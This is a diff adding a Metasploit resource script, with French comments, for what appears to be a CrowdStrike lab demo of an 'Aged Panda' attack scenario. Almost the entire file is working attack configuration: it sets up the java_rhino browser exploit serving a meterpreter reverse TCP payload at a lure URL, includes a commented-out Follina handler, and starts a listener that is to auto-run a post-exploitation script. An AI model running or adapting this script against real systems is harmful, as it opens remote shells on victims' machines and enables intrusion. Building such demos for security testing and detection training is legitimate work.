@@ -1,0 +1,79 @@
+# ============================================================
+#  FALCON ENCOUNTER -- FULL DEMO RC SCRIPT
+#  Aged Panda | SE Lab | CrowdStrike Demo
+#  Usage: msfconsole -r falcon_demo_full.rc
+#  
+#  Flow:
+#  1. Handler listener (Java Rhino ou Follina)
+#  2. Session ouverte --> post-exploitation auto
+#  3. Upload + lancement EDR Master Suite
+#  4. Aged Panda kill chain
+#  5. Rapport final
+# ============================================================
+
+spool /root/falcon_demo/falcon_demo_log.txt
+
+print_status " "
+print_status "============================================="
+print_status "  FALCON ENCOUNTER -- AGED PANDA SCENARIO"
+print_status "  CrowdStrike SE Lab Demo"
+print_status "  $(date)"
+print_status "============================================="
+print_status " "
+
+# ============================================================
+#  PHASE 1 -- LISTENER SETUP
+#  Supporte Java Rhino (browser) ou Follina (docx)
+#  Decommenter le payload voulu
+# ============================================================
+
+print_status "[PHASE 1] Starting listener..."
+
+# -- Option A: Java Rhino (browser exploit) --
+use exploit/multi/browser/java_rhino
+set SRVHOST 10.0.2.100
+set SRVPORT 8080
+set LHOST 10.0.2.100
+set LPORT 4444
+set payload java/meterpreter/reverse_tcp
+set URIPATH /update
+set AllowNoCleanup true
+set ExitOnSession false
+
+# -- Option B: Follina handler (decommenter si .docx vecteur) --
+# use exploit/multi/handler
+# set payload windows/x64/meterpreter/reverse_tcp
+# set LHOST 10.0.2.100
+# set LPORT 4444
+# set ExitOnSession false
+
+exploit -j -z
+
+print_status "[PHASE 1] Listener active -- waiting for session..."
+print_status "[PHASE 1] Victim URL: http://10.0.2.100:8080/update"
+print_status " "
+
+# ============================================================
+#  PHASE 2 -- SESSION HANDLER
+#  Attendre la session et lancer post-exploitation auto
+# ============================================================
+
+print_status "[PHASE 2] Configuring auto post-exploitation..."
+
+# Handler qui se declenche automatiquement a chaque session
+handler -H 10.0.2.100 -P 4444 -p java/meterpreter/reverse_tcp
+
+# ============================================================
+#  PHASE 3 -- POST-EXPLOITATION (via resource script)
+#  Lance automatiquement apres ouverture session
+# ============================================================
+
+# Le fichier post_exploit_full.rc est charge automatiquement
+# quand une session s'ouvre via AutoRunScript
+# Voir: set AutoRunScript multi_console_command -rc /root/falcon_demo/post_exploit_full.rc
+
+print_status " "
+print_status "[*] Session will auto-run post_exploit_full.rc when opened"
+print_status "[*] Monitor sessions with: sessions -l"
+print_status "[*] Interact with: sessions -i [ID]"
+print_status " "
